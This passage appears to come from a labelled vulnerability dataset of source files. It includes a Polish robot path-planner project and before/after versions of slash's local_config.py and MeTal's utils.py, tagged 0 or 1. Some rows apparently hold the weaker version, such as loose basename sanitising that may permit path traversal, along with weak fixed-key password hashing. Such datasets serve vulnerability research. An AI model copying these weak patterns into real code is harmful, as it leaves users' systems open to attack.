                    if u not in cost or new_cost < cost[u]:
                        cost[u] = new_cost
                        center = PathPlanner.obstacle_map_size // 2
                        que.push(u, new_cost + MM.sqrMagnitude(v[0] - u[0], v[1] - u[1]) + self.proximity_map[u[0], u[1]] + int(MM.sqrMagnitude(center - u[0], center - u[1])))
                        visited_from[u] = v
        
        path = []
        if visited_from[end] != None:
            v = end
            while v != start:
                path.append(v)
                v = visited_from[v]
            path.append(start)
        else:
            time.sleep(0.05)
            path.append(end)
        
        return path
    
    #sprawdza, czy promien przecina pole, na ktorym znajduje sie przeszkoda
    def Raycast(self, origin, end):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return False    #jesli punkt startowy jest poza mapa
        if origin == end: return obstacle_map[origin[0], origin[1]]    #jesli promien jest punktem
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(x) + "", "" + str(y) + "")"") 
                if obstacle_map[x, y] > 0:
                    return True
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(y) + "", "" + str(x) + "")"") 
                if obstacle_map[y, x] > 0:
                    return True
                
        return False
    
    #DEBUG
    def PaintRay(self, origin, end, frame):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return    #jesli punkt startowy jest poza mapa
        if origin == end:
            frame[origin[0], origin[1]] = [0, 255, 0]
            return
            
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[x, y] = [0, 255, 0]
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[y, x] = [0, 255, 0]/n/n/n/PythonCode/ServoControllerModule.py/n/nfrom __future__ import division
simulationMode = True

if not simulationMode:
    import sys
    sys.path.append('/home/pi/Adafruit_Python_PCA9685/')
    import Adafruit_PCA9685
    
import math
import MathModule as MM

#program kontrolujacy ruch serw
class ServoController:
    
    #parametry serw
    servo_pulse_neutral = (388, 379)    #wartosci pwm dla pozycji neutralnych serw
    servo_pulse_range = (100, 100)      #zakres wartosci sygnalu pwm dla ruchu serw
    servo_pos_limit = (800, 800)    #ograniczenia wychylen serw (w skali od 0 do 1000)
    servo_movement_speed = (6000, 6000)    #szybkosci ruchu serw
    
    def __init__(self):
        if not simulationMode:
            self.pwm = Adafruit_PCA9685.PCA9685()  #laczenie sie z plytka sterujaca serwami
            self.pwm.set_pwm_freq(60)
        
        #zmienne wartosci
        self.servo_actual_pos = [0, 0]    #aktualna pozycja serwa
        self.servo_target_pos = [0, 0]    #docelowa pozycja serwa
        
        self.update(0)   #aplikowanie domyslnych ustawien serw

    #wydaje polecenie poruszenia serwem na kanale 'channel' na pozycje 'pos' (w skali od -1000 do 1000)
    def moveServo(self, channel, pos):
        self.servo_target_pos[channel] = MM.clamp(pos, -ServoController.servo_pos_limit[channel], ServoController.servo_pos_limit[channel])

    #aktualizuje pozycje serw
    def update(self, deltaTime):
        for i in range(2): #tylko 2 serwa
            
            movement_dir = MM.sign(self.servo_target_pos[i] - self.servo_actual_pos[i])
            self.servo_actual_pos[i] += ServoController.servo_movement_speed[i] * movement_dir * deltaTime
            
            if movement_dir > 0: self.servo_actual_pos[i] = min(self.servo_actual_pos[i], self.servo_target_pos[i])
            elif movement_dir < 0: self.servo_actual_pos[i] = max(self.servo_actual_pos[i], self.servo_target_pos[i])
                
            if not simulationMode:
                pos = round(ServoController.servo_pulse_neutral[i] + ServoController.servo_pulse_range[i] * self.servo_actual_pos[i] / 1000)
                self.pwm.set_pwm(i, 0, pos)
            else:
                self.servo_actual_pos[i] = round(self.servo_actual_pos[i])
/n/n/n/PythonCode/TensorflowProcessingModule.py/n/nimport numpy as np

print(""Importing Tensorflow libraries"")
from tensorflow.contrib.lite.python import interpreter as interpreter_wrapper
import tensorflow as tf

#klasa z funkcjami do przetwarzania danych sieciami neuronowymi z Tensorflow
class TensorflowProcessor:
    
    #sciezka do uzywanego modelu
    ball_detector_model_path = ""/home/pi/ballance/Ballance/Tensorflow/ballancenet_conv_3_quant.tflite""
    corner_detector_model_path = ""/home/pi/ballance/Ballance/Tensorflow/ballancenet_boardcorner_conv_2_quant.tflite""
    
    #funkcja generujaca zoptymalizowany model
    def QuantizeModel(model_path, output_file_name):
        print(""Quantizing model"")
        converter = tf.contrib.lite.TocoConverter.from_saved_model(model_path)
        converter.post_training_quantize = True
        quant_model = converter.convert()
        open(output_file_name + "".tflite"", ""wb"").write(quant_model)
        
    def __init__(self):
        print(""Creating TensorflowProcessor object"")
        #wczytywanie modelu do wykrywania kulki
        print(""Loading ball detection tflite model"")
        self.ball_detector_interpreter = interpreter_wrapper.Interpreter(model_path=TensorflowProcessor.ball_detector_model_path)
        self.ball_detector_interpreter.allocate_tensors()
        self.ball_detector_input_details = self.ball_detector_interpreter.get_input_details()
        self.ball_detector_output_details = self.ball_detector_interpreter.get_output_details()
        
        #wczytywanie modelu do wykrywania krawedzi plyty
        print(""Loading corner detection tflite model"")
        self.corner_detector_interpreter = interpreter_wrapper.Interpreter(model_path=TensorflowProcessor.corner_detector_model_path)
        self.corner_detector_interpreter.allocate_tensors()
        self.corner_detector_input_details = self.corner_detector_interpreter.get_input_details()
        self.corner_detector_output_details = self.corner_detector_interpreter.get_output_details()
        
        print(""TensorflowProcessor object created"")
        
    def getBallPosition(self, image):
        #przygotowanie obrazu
        image = np.float32(image)
        image /= 255.0
        image = np.expand_dims(image, axis=0)
        image = np.expand_dims(image, axis=3)
        
        #wykonanie interpretacji
        self.ball_detector_interpreter.set_tensor(self.ball_detector_input_details[0]['index'], image)
        self.ball_detector_interpreter.invoke()
        
        return np.squeeze(self.ball_detector_interpreter.get_tensor(self.ball_detector_output_details[0]['index']))
    
    def getCornerPosition(self, image):
        #przygotowanie obrazu
        image = np.float32(image)
        image /= 255.0
        image = np.expand_dims(image, axis=0)
        image = np.expand_dims(image, axis=3)
        
        #wykonanie interpretacji
        self.corner_detector_interpreter.set_tensor(self.corner_detector_input_details[0]['index'], image)
        self.corner_detector_interpreter.invoke()
        
        return np.squeeze(self.corner_detector_interpreter.get_tensor(self.corner_detector_output_details[0]['index']))/n/n/n/PythonCode/test.py/n/nimport PathPlannerModule as PPM
import math

pathPlanner = PPM.PathPlanner()

origin = (0, 0)
r = 10000

for angle in range(0, 360):
    ang = angle * math.pi / 180
    end = (int(round(math.sin(ang) * r)), int(round(math.cos(ang) * r)))
    print(""end = "" + str(end))
    pathPlanner.Raycast(origin, end)
    print("""")/n/n/n",1
144,d7008f476f73ee08d7b71701e4839dd05e92baae,"slash/core/local_config.py/n/nimport os
import dessert
from emport import import_file
from ..utils.python import check_duplicate_functions

class LocalConfig(object):

    def __init__(self):
        super(LocalConfig, self).__init__()
        self._slashconf_vars_cache = {}
        self._configs = []
        self.duplicate_funcs = set()

    def push_path(self, path):
        self._configs.append(self._build_config(path))

    def pop_path(self):
        self._configs.pop(-1)

    def get_dict(self):
        return self._configs[-1]

    def _build_config(self, path):
        confstack = []
        for dir_path in self._traverse_upwards(path):
            slashconf_vars = self._slashconf_vars_cache.get(dir_path)
            if slashconf_vars is None:
                slashconf_path = os.path.join(dir_path, 'slashconf.py')
                if os.path.isfile(slashconf_path):
                    self.duplicate_funcs |= check_duplicate_functions(slashconf_path)
                    with dessert.rewrite_assertions_context():
                        slashconf_vars = self._slashconf_vars_cache[dir_path] = vars(import_file(slashconf_path))

            if slashconf_vars is not None:
                confstack.append(slashconf_vars)

        returned = {}
        # start loading from the parent so that vars are properly overriden
        for slashconf_vars in reversed(confstack):
            returned.update(slashconf_vars)
        return returned

    def _traverse_upwards(self, path):
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise RuntimeError(""Path doesn't exist: {0}"".format(path))

        if os.path.isfile(path):
            path = os.path.dirname(path)

        while True:
            yield path
            if os.path.normcase(path) == os.path.normcase(os.path.abspath(os.path.sep)):
                break
            new_path = os.path.dirname(path)
            assert new_path != path
            path = new_path
/n/n/n",0
145,d7008f476f73ee08d7b71701e4839dd05e92baae,"/slash/core/local_config.py/n/nimport os
import dessert
from emport import import_file
from ..utils.python import check_duplicate_functions

class LocalConfig(object):

    def __init__(self):
        super(LocalConfig, self).__init__()
        self._slashconf_vars_cache = {}
        self._configs = []
        self.duplicate_funcs = set()

    def push_path(self, path):
        self._configs.append(self._build_config(path))

    def pop_path(self):
        self._configs.pop(-1)

    def get_dict(self):
        return self._configs[-1]

    def _build_config(self, path):
        confstack = []
        for dir_path in self._traverse_upwards(path):
            slashconf_vars = self._slashconf_vars_cache.get(dir_path)
            if slashconf_vars is None:
                slashconf_path = os.path.join(dir_path, 'slashconf.py')
                if os.path.isfile(slashconf_path):
                    self.duplicate_funcs |= check_duplicate_functions(slashconf_path)
                    with dessert.rewrite_assertions_context():
                        slashconf_vars = self._slashconf_vars_cache[dir_path] = vars(import_file(slashconf_path))

            if slashconf_vars is not None:
                confstack.append(slashconf_vars)

        returned = {}
        # start loading from the parent so that vars are properly overriden
        for slashconf_vars in reversed(confstack):
            returned.update(slashconf_vars)
        return returned

    def _traverse_upwards(self, path):
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise RuntimeError(""Path doesn't exist: {0}"".format(path))

        if os.path.isfile(path):
            path = os.path.dirname(path)

        while True:
            yield path
            if path == os.path.abspath(os.path.sep):
                break
            new_path = os.path.dirname(path)
            assert new_path != path
            path = new_path
/n/n/n",1
146,15ad33e40f77cb2d3fde4747f5be5457502e33a1,"slash/core/local_config.py/n/nimport os
import dessert
from emport import import_file
from ..utils.python import check_duplicate_functions

class LocalConfig(object):

    def __init__(self):
        super(LocalConfig, self).__init__()
        self._slashconf_vars_cache = {}
        self._configs = []
        self.duplicate_funcs = set()

    def push_path(self, path):
        self._configs.append(self._build_config(path))

    def pop_path(self):
        self._configs.pop(-1)

    def get_dict(self):
        return self._configs[-1]

    def _build_config(self, path):
        confstack = []
        for dir_path in self._traverse_upwards(path):
            slashconf_vars = self._slashconf_vars_cache.get(dir_path)
            if slashconf_vars is None:
                slashconf_path = os.path.join(dir_path, 'slashconf.py')
                if os.path.isfile(slashconf_path):
                    self.duplicate_funcs |= check_duplicate_functions(slashconf_path)
                    with dessert.rewrite_assertions_context():
                        slashconf_vars = self._slashconf_vars_cache[dir_path] = vars(import_file(slashconf_path))

            if slashconf_vars is not None:
                confstack.append(slashconf_vars)

        returned = {}
        # start loading from the parent so that vars are properly overriden
        for slashconf_vars in reversed(confstack):
            returned.update(slashconf_vars)
        return returned

    def _traverse_upwards(self, path):
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise RuntimeError(""Path doesn't exist: {}"".format(path))

        if os.path.isfile(path):
            path = os.path.dirname(path)

        upward_limit = os.path.splitdrive(os.path.normcase(os.path.abspath(os.path.sep)))[1]

        while True:
            yield path
            if os.path.splitdrive(os.path.normcase(path))[1] == upward_limit:
                break
            new_path = os.path.dirname(path)
            assert new_path != path
            path = new_path
/n/n/n",0
147,15ad33e40f77cb2d3fde4747f5be5457502e33a1,"/slash/core/local_config.py/n/nimport os
import dessert
from emport import import_file
from ..utils.python import check_duplicate_functions

class LocalConfig(object):

    def __init__(self):
        super(LocalConfig, self).__init__()
        self._slashconf_vars_cache = {}
        self._configs = []
        self.duplicate_funcs = set()

    def push_path(self, path):
        self._configs.append(self._build_config(path))

    def pop_path(self):
        self._configs.pop(-1)

    def get_dict(self):
        return self._configs[-1]

    def _build_config(self, path):
        confstack = []
        for dir_path in self._traverse_upwards(path):
            slashconf_vars = self._slashconf_vars_cache.get(dir_path)
            if slashconf_vars is None:
                slashconf_path = os.path.join(dir_path, 'slashconf.py')
                if os.path.isfile(slashconf_path):
                    self.duplicate_funcs |= check_duplicate_functions(slashconf_path)
                    with dessert.rewrite_assertions_context():
                        slashconf_vars = self._slashconf_vars_cache[dir_path] = vars(import_file(slashconf_path))

            if slashconf_vars is not None:
                confstack.append(slashconf_vars)

        returned = {}
        # start loading from the parent so that vars are properly overriden
        for slashconf_vars in reversed(confstack):
            returned.update(slashconf_vars)
        return returned

    def _traverse_upwards(self, path):
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise RuntimeError(""Path doesn't exist: {}"".format(path))

        if os.path.isfile(path):
            path = os.path.dirname(path)

        while True:
            yield path
            if os.path.normcase(path) == os.path.normcase(os.path.abspath(os.path.sep)):
                break
            new_path = os.path.dirname(path)
            assert new_path != path
            path = new_path
/n/n/n",1
148,3f7c7442fa49aec37577dbdb47ce11a848e7bd03,"MeTal/core/utils.py/n/nimport urllib, re, html

from settings import (MAX_BASENAME_LENGTH, ITEMS_PER_PAGE,
    PASSWORD_KEY, SECRET_KEY, BASE_URL, BASE_URL_ROOT)

from core.libs.bottle import redirect, response

import hashlib, base64

from core.libs.bottle import _stderr

DATE_FORMAT = '%Y-%m-%d %H:%M:%S'

def default(obj):
    import datetime
    if isinstance(obj, datetime.datetime):
        return datetime.datetime.strftime(obj, '%Y-%m-%d %H:%M:%S')

def json_dump(obj):
    import json
    from core.libs.playhouse.shortcuts import model_to_dict
    # we have to do this as a way to keep dates from choking
    return json.loads(json.dumps(model_to_dict(obj, recurse=False),
            default=default,
            separators=(', ', ': '),
            indent=1))

def field_error(e):
    _ = re.compile('UNIQUE constraint failed: (.*)$')
    m = _.match(str(e))
    error = {'blog.local_path':'''
The file path for this blog is the same as another blog in this system.
File paths must be unique.
''', 'blog.url':'''
The URL for this blog is the same as another blog in this system.
URLs for blogs must be unique.
'''}[m.group(1)]
    return error

def quote_escape(string):
    string = string.replace(""'"", ""&#39"")
    string = string.replace('""', ""&#34"")
    return string

def preview_file(identifier, extension):
    file_identifier = ""preview-{}"".format(identifier)
    import zlib
    return ('preview-' +
        str(zlib.crc32(file_identifier.encode('utf-8'), 0xFFFF)) +
        ""."" + extension)

def preview_file_old(filename, extension):
    import zlib
    try:
        split_path = filename.rsplit('/', 1)[1]
    except IndexError:
        split_path = filename
    return ('preview-' +
        str(zlib.crc32(split_path.encode('utf-8'), 0xFFFF)) +
        ""."" + extension)

def verify_path(path):
    '''
    Stub function to ensure a given path
    a) exists
    b) is writable
    c) is not on top of a path used by the application
    '''

    # verify the path exists
    # verify that it is writable
    # verify it is not within the application directory

    pass

def is_blank(string):
    if string and string.strip():
        return False
    return True

def url_escape(url):
    return urllib.parse.quote_plus(url)

def url_unescape(url):
    return urllib.parse.unquote_plus(url)

def safe_redirect(url):
    url_unquoted = urllib.parse.unquote_plus(url)
    if url_unquoted.startswith(BASE_URL + ""/""):
        redirect(url)
    else:
        redirect(BASE_URL)

def _stddebug_():
    from core.boot import settings
    _stddebug = lambda x: _stderr(x) if (settings.DEBUG_MODE is True) else lambda x: None  # @UnusedVariable
    return _stddebug

class Status:
    '''
    Used to create status messages for AJAX UI.
    '''
    status_types = {'success':'ok-sign',
        'info':'info-sign',
        'warning':'exclamation-sign',
        'danger':'remove-sign'}

    def __init__(self, **ka):

        self.type = ka['type']
        if 'vals' in ka:
            formatting = list(map(html_escape, ka['vals']))
            self.message = ka['message'].format(*formatting)
        else:
            self.message = ka['message']

        if self.type not in ('success', 'info') and 'no_sure' not in ka:
            self.message += ""<p><b>Are you sure you want to do this?</b></p>""


        if self.type in self.status_types:
            self.icon = self.status_types[self.type]

        self.confirm = ka.get('yes', None)
        self.deny = ka.get('no', None)

        self.action = ka.get('action', None)
        self.url = ka.get('url', None)

        self.message_list = ka.get('message_list', None)
        self.close = ka.get('close', True)


def logout_nonce(user):
    return csrf_hash(str(user.id) + str(user.last_login) + 'LOGOUT')

def csrf_hash(csrf):
    '''
    Generates a CSRF token value, by taking an input and generating a SHA-256 hash from it,
    in conjunction with the secret key set for the installation.
    '''

    enc = str(csrf) + SECRET_KEY

    m = hashlib.sha256()
    m.update(enc.encode('utf-8'))
    m = m.digest()
    encrypted_csrf = base64.b64encode(m).decode('utf-8')

    return (encrypted_csrf)

def csrf_tag(csrf):
    '''
    Generates a hidden input field used to carry the CSRF token for form submissions.
    '''
    return ""<input type='hidden' name='csrf' id='csrf' value='{}'>"".format(csrf_hash(csrf))

def string_to_date(date_string):
    import datetime
    return datetime.datetime.strptime(date_string, DATE_FORMAT)

def date_format(date_time):
    '''
    Formats a datetime value in a consistent way for presentation.
    '%Y-%m-%d %H:%M:%S' is the standard format.
    '''
    if date_time is None:
        return ''
    else:
        return date_time.strftime(DATE_FORMAT)


def utf8_escape(input_string):
    '''
    Used for cross-converting a string to encoded UTF8;
    for instance, for database submissions,
    '''
    return bytes(input_string, 'iso-8859-1').decode('utf-8')

def html_escape(input_string):
    '''
    Used for returning text from the server that might have HTML that needs escaping,
    such as a status message that might have spurious HTML in it (e.g., a page title).
    '''
    return html.escape(str(input_string))

def create_basename_core(basename):
    try:
        basename = basename.casefold()
    except Exception:
        basename = basename.lower()

    basename = re.sub(r'[ \./]', r'-', basename)
    basename = re.sub(r'<[^>]*>', r'', basename)
    basename = re.sub(r'[^a-z0-9\-]', r'', basename)
    basename = re.sub(r'\-\-', r'-', basename)
    basename = urllib.parse.quote_plus(basename)

    return basename

def create_basename(input_string, blog):
    '''
    Generate a basename from a given input string.

    Checks across the entire blog in question for a basename collision.

    Basenames need to be unique to the filesystem for where the target files
    are to be written. By default this is enforced in the database by way of a
    unique column constraint.
    '''

    if not input_string:
        input_string = ""page""

    basename = input_string
    basename_test = create_basename_core(basename)

    from core.models import Page

    n = 0

    while True:

        try:
            Page.get(Page.basename == basename_test,
                Page.blog == blog)
        except Page.DoesNotExist:
            return (basename_test[:MAX_BASENAME_LENGTH])

        n += 1
        basename_test = basename + ""-"" + str(n)

def trunc(string, length=128):
    '''
    Truncates a string with ellipses.
    This function may eventually be replaced with a CSS-based approach.
    '''
    if string is None:
        return """"
    string = (string[:length] + ' ...') if len(string) > length else string
    return string

breaks_list = ['/', '.', '-', '_']

def breaks(string):
    '''
    Used to break up URLs and basenames so they wrap properly
    '''
    if string is None:
        return string

    for n in breaks_list:
        string = string.replace(n, n + '<wbr>')

    return string

def tpl_oneline(string):

    if string[0] == '%':
        string = '\\' + string

    return string

def tpl_include(tpl):
    # get absolute path for template relative to blog root
    # get default mapping
    # prepend /? do we need to have those in the mapping?
    return '<!--#include virtual=""{}"" -->'.format(
        tpl)

from core.libs.bottle import SimpleTemplate
class MetalTemplate(SimpleTemplate):
    includes = []
    def __init__(self, *args, **kwargs):
        super(MetalTemplate, self).__init__(*args, **kwargs)
        self._tags = kwargs.get('tags', None)

    def _include(self, env, _name=None, **kwargs):
        from core.models import Template
        template_to_import = Template.get(
            Template.blog == self._tags.get('blog', None),
            Template.title == _name)
        tpl = MetalTemplate(template_to_import.body, tags=self._tags)
        self.includes.append(_name)
        return tpl.execute(env['_stdout'], env)
    def render(self, *args, **kwargs):
        return super(MetalTemplate, self).render(*args, **kwargs)

def tpl(*args, **ka):
    '''
    Shim for the template function to force it to use a string that might be
    ambiguously a filename.
    '''
    # TODO: debug handler for errors in submitted user templates here?
    tp = MetalTemplate('\n' + args[0], tags=ka)
    x = tp.render(ka)
    return x[1:]

tp_cache = {}

def tpl2(template, **ka):
    try:
        template_to_render = tp_cache[template.blog.id][template.id]
    except KeyError:
        template_to_render = MetalTemplate('\n' + template.body, tags=ka)
        tp_cache[template.blog.id][template.id] = template_to_render
    x = template_to_render.render(ka)
    return x[1:]


def generate_paginator(obj, request, items_per_page=ITEMS_PER_PAGE):

    '''
    Generates a paginator block for browsing lists, for instance in the blog or site view.
    '''
    page_num = page_list_id(request)

    paginator = {}

    paginator['page_count'] = obj.count()

    paginator['max_pages'] = int((paginator['page_count'] / items_per_page) + (paginator['page_count'] % items_per_page > 0))

    if page_num > paginator['max_pages']:
        page_num = paginator['max_pages']

    paginator['next_page'] = (page_num + 1) if page_num < paginator['max_pages'] else paginator['max_pages']
    paginator['prev_page'] = (page_num - 1) if page_num > 1 else 1

    paginator['first_item'] = (page_num * items_per_page) - (items_per_page - 1)
    paginator['last_item'] = paginator['page_count'] if (page_num * items_per_page) > paginator['page_count'] else (page_num * items_per_page)

    paginator['page_num'] = page_num
    paginator['items_per_page'] = items_per_page

    obj_list = obj.paginate(page_num, ITEMS_PER_PAGE)

    return paginator, obj_list



def generate_date_mapping(date_value, tags, path_string):
    '''
    Generates a date mapping string, usually from a template mapping,
    using a date value, a tag set, and the supplied path string.
    This is often used for resolving template mappings.
    The tag set is contextual -- e.g., for a blog or a site.
    '''

    time_string = date_value.strftime(path_string)
    path_string = tpl(time_string, **tags.__dict__)

    return path_string

def postpone(function):
    '''
    Thread launcher function
    '''
    def decorator(*args, **ka):
        t = Thread(target=function, args=args, kwargs=ka)
        t.daemon = True
        t.start()

    return decorator


def encrypt_password(password, key=None):

    if key is None:
        p_key = PASSWORD_KEY
    else:
        p_key = key

    bin_password = password.encode('utf-8')
    bin_salt = p_key.encode('utf-8')

    m = hashlib.sha256()
    for n in range(1, 1000):
        m.update(bin_password + bin_salt)
    m = m.digest()
    encrypted_password = base64.b64encode(m)

    return encrypted_password

def memoize(f):
    '''
    Memoization decorator for a function taking one or more arguments.
    '''
    # pinched from http://code.activestate.com/recipes/578231-probably-the-fastest-memoization-decorator-in-the-/
    class memodict(dict):
        def __getitem__(self, *key):
            return dict.__getitem__(self, key)

        def __missing__(self, key):
            ret = self[key] = f(*key)
            return ret

    return memodict().__getitem__

def memoize_delete(obj, item):
    obj.__self__.__delitem__(item)

def _iter(item):
    try:
        (x for x in item)
    except BaseException:
        return (item,)
    else:
        return item


def page_list_id(request):

    if not request.query.page:
        return 1
    try:
        page = int(request.query.page)
    except ValueError:
        return 1
    return page


def raise_request_limit():
    from core.libs import bottle
    import settings
    bottle.BaseRequest.MEMFILE_MAX = settings.MAX_REQUEST

def disable_protection():
    response.set_header('Frame-Options', '')
    # response.set_header('Content-Security-Policy', '')

def action_button(label, url):
    action = ""<a href='{}'><button type='button' class='btn btn-sm'>{}</button></a>"".format(
        url,
        label
        )

    return action
/n/n/n",0
149,3f7c7442fa49aec37577dbdb47ce11a848e7bd03,"/MeTal/core/utils.py/n/nimport urllib, re, html

from settings import (MAX_BASENAME_LENGTH, ITEMS_PER_PAGE,
    PASSWORD_KEY, SECRET_KEY, BASE_URL, BASE_URL_ROOT)

from core.libs.bottle import redirect, response

import hashlib, base64

from core.libs.bottle import _stderr

DATE_FORMAT = '%Y-%m-%d %H:%M:%S'

def default(obj):
    import datetime
    if isinstance(obj, datetime.datetime):
        return datetime.datetime.strftime(obj, '%Y-%m-%d %H:%M:%S')

def json_dump(obj):
    import json
    from core.libs.playhouse.shortcuts import model_to_dict
    # we have to do this as a way to keep dates from choking
    return json.loads(json.dumps(model_to_dict(obj, recurse=False),
            default=default,
            separators=(', ', ': '),
            indent=1))

def field_error(e):
    _ = re.compile('UNIQUE constraint failed: (.*)$')
    m = _.match(str(e))
    error = {'blog.local_path':'''
The file path for this blog is the same as another blog in this system.
File paths must be unique.
''', 'blog.url':'''
The URL for this blog is the same as another blog in this system.
URLs for blogs must be unique.
'''}[m.group(1)]
    return error

def quote_escape(string):
    string = string.replace(""'"", ""&#39"")
    string = string.replace('""', ""&#34"")
    return string

def preview_file(identifier, extension):
    file_identifier = ""preview-{}"".format(identifier)
    import zlib
    return ('preview-' +
        str(zlib.crc32(file_identifier.encode('utf-8'), 0xFFFF)) +
        ""."" + extension)

def preview_file_old(filename, extension):
    import zlib
    try:
        split_path = filename.rsplit('/', 1)[1]
    except IndexError:
        split_path = filename
    return ('preview-' +
        str(zlib.crc32(split_path.encode('utf-8'), 0xFFFF)) +
        ""."" + extension)

def verify_path(path):
    '''
    Stub function to ensure a given path
    a) exists
    b) is writable
    c) is not on top of a path used by the application
    '''

    # verify the path exists
    # verify that it is writable
    # verify it is not within the application directory

    pass

def is_blank(string):
    if string and string.strip():
        return False
    return True

def url_escape(url):
    return urllib.parse.quote_plus(url)

def url_unescape(url):
    return urllib.parse.unquote_plus(url)

def safe_redirect(url):
    url_unquoted = urllib.parse.unquote_plus(url)
    if url_unquoted.startswith(BASE_URL + ""/""):
        redirect(url)
    else:
        redirect(BASE_URL)

def _stddebug_():
    from core.boot import settings
    _stddebug = lambda x: _stderr(x) if (settings.DEBUG_MODE is True) else lambda x: None  # @UnusedVariable
    return _stddebug

class Status:
    '''
    Used to create status messages for AJAX UI.
    '''
    status_types = {'success':'ok-sign',
        'info':'info-sign',
        'warning':'exclamation-sign',
        'danger':'remove-sign'}

    def __init__(self, **ka):

        self.type = ka['type']
        if 'vals' in ka:
            formatting = list(map(html_escape, ka['vals']))
            self.message = ka['message'].format(*formatting)
        else:
            self.message = ka['message']

        if self.type not in ('success', 'info') and 'no_sure' not in ka:
            self.message += ""<p><b>Are you sure you want to do this?</b></p>""


        if self.type in self.status_types:
            self.icon = self.status_types[self.type]

        self.confirm = ka.get('yes', None)
        self.deny = ka.get('no', None)

        self.action = ka.get('action', None)
        self.url = ka.get('url', None)

        self.message_list = ka.get('message_list', None)
        self.close = ka.get('close', True)


def logout_nonce(user):
    return csrf_hash(str(user.id) + str(user.last_login) + 'LOGOUT')

def csrf_hash(csrf):
    '''
    Generates a CSRF token value, by taking an input and generating a SHA-256 hash from it,
    in conjunction with the secret key set for the installation.
    '''

    enc = str(csrf) + SECRET_KEY

    m = hashlib.sha256()
    m.update(enc.encode('utf-8'))
    m = m.digest()
    encrypted_csrf = base64.b64encode(m).decode('utf-8')

    return (encrypted_csrf)

def csrf_tag(csrf):
    '''
    Generates a hidden input field used to carry the CSRF token for form submissions.
    '''
    return ""<input type='hidden' name='csrf' id='csrf' value='{}'>"".format(csrf_hash(csrf))

def string_to_date(date_string):
    import datetime
    return datetime.datetime.strptime(date_string, DATE_FORMAT)

def date_format(date_time):
    '''
    Formats a datetime value in a consistent way for presentation.
    '%Y-%m-%d %H:%M:%S' is the standard format.
    '''
    if date_time is None:
        return ''
    else:
        return date_time.strftime(DATE_FORMAT)


def utf8_escape(input_string):
    '''
    Used for cross-converting a string to encoded UTF8;
    for instance, for database submissions,
    '''
    return bytes(input_string, 'iso-8859-1').decode('utf-8')

def html_escape(input_string):
    '''
    Used for returning text from the server that might have HTML that needs escaping,
    such as a status message that might have spurious HTML in it (e.g., a page title).
    '''
    return html.escape(str(input_string))

def create_basename_core(basename):
    try:
        basename = basename.casefold()
    except Exception:
        basename = basename.lower()

    basename = basename.replace(' ', '-')
    basename = re.sub(r'<[^>]*>', r'', basename)
    basename = re.sub(r'[^a-z0-9\-]', r'', basename)
    basename = re.sub(r'\-\-', r'-', basename)
    basename = urllib.parse.quote_plus(basename)

    return basename

def create_basename(input_string, blog):
    '''
    Generate a basename from a given input string.

    Checks across the entire blog in question for a basename collision.

    Basenames need to be unique to the filesystem for where the target files
    are to be written. By default this is enforced in the database by way of a
    unique column constraint.
    '''

    if not input_string:
        input_string = ""page""

    basename = input_string
    basename_test = create_basename_core(basename)

    from core.models import Page

    n = 0

    while True:

        try:
            Page.get(Page.basename == basename_test,
                Page.blog == blog)
        except Page.DoesNotExist:
            return (basename_test[:MAX_BASENAME_LENGTH])

        n += 1
        basename_test = basename + ""-"" + str(n)

def trunc(string, length=128):
    '''
    Truncates a string with ellipses.
    This function may eventually be replaced with a CSS-based approach.
    '''
    if string is None:
        return """"
    string = (string[:length] + ' ...') if len(string) > length else string
    return string

breaks_list = ['/', '.', '-', '_']

def breaks(string):
    '''
    Used to break up URLs and basenames so they wrap properly
    '''
    if string is None:
        return string

    for n in breaks_list:
        string = string.replace(n, n + '<wbr>')

    return string

def tpl_oneline(string):

    if string[0] == '%':
        string = '\\' + string

    return string

def tpl_include(tpl):
    # get absolute path for template relative to blog root
    # get default mapping
    # prepend /? do we need to have those in the mapping?
    return '<!--#include virtual=""{}"" -->'.format(
        tpl)

from core.libs.bottle import SimpleTemplate
class MetalTemplate(SimpleTemplate):
    includes = []
    def __init__(self, *args, **kwargs):
        super(MetalTemplate, self).__init__(*args, **kwargs)
        self._tags = kwargs.get('tags', None)

